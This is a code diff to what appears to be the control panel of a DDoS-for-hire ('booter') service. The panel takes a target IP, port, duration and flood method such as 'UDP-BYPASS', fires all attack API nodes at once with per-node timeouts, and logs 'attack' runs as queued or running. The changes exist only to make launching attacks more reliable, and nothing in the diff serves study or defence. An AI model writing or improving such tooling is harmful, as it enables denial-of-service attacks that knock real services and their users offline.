@@ -89,8 +89,11 @@ export default function Panel() {
     fetchRuns();
     fetchTodayCount();
     checkBusy();
-    // Poll every 5 s so busy states stay fresh
-    const timer = setInterval(checkBusy, 5000);
+    // Poll every 5 s — refresh both active runs list and busy state
+    const timer = setInterval(() => {
+      fetchRuns();
+      checkBusy();
+    }, 5000);
     return () => clearInterval(timer);
   }, [user]);
 
@@ -218,16 +221,21 @@ export default function Panel() {
             ? { method: 1, ip: target.trim(), port: parseInt(port, 10), duration }
             : { method: 2, ip: target.trim(), time: duration };
 
+        // Fire all API nodes simultaneously with a 5 s timeout each
         const results = await Promise.allSettled(
-          apis.map((api) =>
-            fetch(`${api.url}/api/hit`, {
+          apis.map((api) => {
+            const controller = new AbortController();
+            const timer = setTimeout(() => controller.abort(), 5000);
+            return fetch(`${api.url}/api/hit`, {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify(body),
+              signal: controller.signal,
             })
               .then((r) => r.json())
               .then((data) => ({ url: api.url, instance_id: data.instance_id }))
-          )
+              .finally(() => clearTimeout(timer));
+          })
         );
 
         results.forEach((r) => {
@@ -245,15 +253,16 @@ export default function Panel() {
     // ── Save run record ─────────────────────────────────────────────────
     const table = layer === "L4" ? "l4_runs" : "l7_runs";
     const hasApiHit = Object.keys(apiInstances).length > 0;
-    // If no API responded the attack never actually started → save as "failed"
-    // so is_l4_busy / is_l7_busy don't block the next attempt.
-    const runStatus = hasApiHit ? "running" : (layer === "L4" && (method === "UDP-NORMAL" || method === "UDP-BYPASS") ? "failed" : "queued");
+    // "running"  → at least one API node confirmed receipt (started_at set)
+    // "queued"   → no API responded yet; is_l4/l7_busy still counts this
+    //              via the time-aware DB check, and it shows in Active runs.
+    //              It auto-expires after created_at + duration + 30 s grace.
     const { error } = await supabase.from(table).insert({
       user_id:    user.id,
       target:     target.trim(),
       method,
       duration,
-      status:     runStatus,
+      status:     hasApiHit ? "running" : "queued",
       started_at: hasApiHit ? new Date().toISOString() : null,
     });
 
